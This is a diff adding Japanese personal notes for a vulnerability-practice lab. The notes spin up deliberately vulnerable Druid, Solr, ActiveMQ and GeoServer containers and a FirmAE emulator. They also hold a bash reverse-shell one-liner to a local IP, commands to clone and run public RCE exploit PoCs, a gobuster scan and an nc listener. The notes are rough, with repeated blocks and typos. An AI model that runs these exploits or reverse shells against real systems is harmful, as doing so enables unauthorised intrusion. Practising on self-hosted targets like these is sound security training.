@@ -1,0 +1,148 @@
+ホスト
+ls -la /dev/loop*
+
+sudo modprobe loop
+# ループデバイスのノードを手動作成（0〜7番あたりまであれば十分なことが多い）
+for i in $(seq 0 7); do
+  sudo mknod -m660 /dev/loop$i b 7 $i 2>/dev/null
+done
+ls -la /dev/loop*
+
+sudo modprobe loop
+# ループデバイスのノードを手動作成（0〜7番あたりまであれば十分なことが多い）
+for i in $(seq 0 7); do
+  sudo mknod -m660 /dev/loop$i b 7 $i 2>/dev/null
+done
+ls -la /dev/loop*
+
+
+# ホスト側
+sudo modprobe loop max_loop=64
+
+ホスト
+sudo apt update
+sudo apt install -y docker.io
+sudo systemctl start docker
+sudo systemctl enable docker
+sudo usermod -aG docker $USER
+
+ドッカー
+docker rm -f firmae
+docker run --privileged -it --name firmae \
+  -v /dev:/dev \
+  ubuntu:18.04 bash
+
+# コンテナの中（Ubuntu）で実行
+apt-get update
+apt-get install -y git python3 python3-pip qemu-system-arm qemu-system-mips qemu-system-x86 busybox-static fakeroot git-lfs kpartx util-linux netcat-openbsd sudo
+
+git clone --recursive https://github.com/pr0v3rbs/FirmAE
+cd FirmAE
+./download.sh
+./install.sh
+
+./init.sh
+
+
+# pingパッケージをインストール
+apt-get update
+apt-get install -y iputils-ping
+
+
+
+
+
+
+
+docker run -d --name druid-lab -p 8888:8888 vulfocus/apache_druid-cve_2021_25646
+
+
+バージョン情報取得
+http://<Druid_IP>:8888/status
+
+バージョン検索
+CVE-2023-25194
+でてくる
+
+
+
+git clone https://github.com/tiemio/RCE-PoC-CVE-2021-25646.git
+
+http://<Druid_IP>:8888/status
+
+sudo apt install gccgo-go
+sudo apt install golang-go
+
+bash -c 'bash -i >& /dev/tcp/172.17.0.1/4443 0>&1'
+
+
+
+
+Apache Solr RCE (CVE-2019-17558)
+概要:
+企業検索エンジンとして広く使われている Apache Solr の未認証RCEです。Solrの管理コンソール経由で Velocity テンプレート言語のパラメータ（params.resource.loader.enabled）を有効化し、SSTI（テンプレート注入）を経由してOSコマンドを実行します。
+
+画面見た目:
+Apache Solr 本物のグラフィカルな Web 管理コンソール（Dashboard / Core Admin 画面）が表示されます。
+
+docker run -d --name solr-rce -p 8983:8983 vulfocus/solr-cve_2019_17558
+
+https://nvd.nist.gov/vuln/detail/cve-2019-17558
+
+docker exec -it -u root <コンテナ名またはコンテナID> bash
+
+msfconsoleで解決
+
+
+
+
+Apache ActiveMQ - 未認証 RCE (CVE-2023-46604)
+企業向けメッセージングミドルウェア「ActiveMQ」の2023年台を代表する重大な脆弱性です。
+
+概要:
+
+OpenWire プロトコルの通信処理におけるデシリアライズ不備（ClassPathXmlApplicationContext の不正呼び出し）を突かれ、ログインなしで任意コード（OSコマンド）が実行されます。
+
+画面見た目:
+
+ActiveMQ 本物のグラフィカルな Web 管理コンソール画面（[http://127.0.0.1:8161](http://127.0.0.1:8161)）が表示されます
+
+
+docker run -d --name activemq-lab -p 8161:8161 -p 61616:61616 vulhub/activemq:5.17.3
+
+
+
+
+
+
+
+
+GeoServer - OGC Filter 未認証 RCE (CVE-2024-36401)
+GIS（地理情報システム）サーバーソフトウェア「GeoServer」で2024年に公開され非常に話題となった脆弱性です。
+
+概要:
+
+GeoTools ライブラリ内の XPath 評価（commons-jxpath）処理に不備があり、リクエスト内の OGC フィルター機能経由で認証不要の RCE が発生します。
+
+画面見た目:
+
+GeoServer 本物の Web 管理UI（データストアやマップビューアの統合管理画面）が表示されます。
+
+docker run -d --name geoserver-lab -p 8080:8080 vulhub/geoserver:2.23.2
+
+
+gobuster dir -u http://192.168.45.171:8080/-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
+
+git clone https://github.com/Chocapikk/CVE-2024-36401.git
+
+python3 -m venv venv
+
+source venv/bin/activate 
+
+pip install -r requirements. txt
+
+python exploit.py -u http://192.168.45.171:8080/ -ip 192.168.45.169 -rp 8443
+
+nc -nvlp 8443
+
+
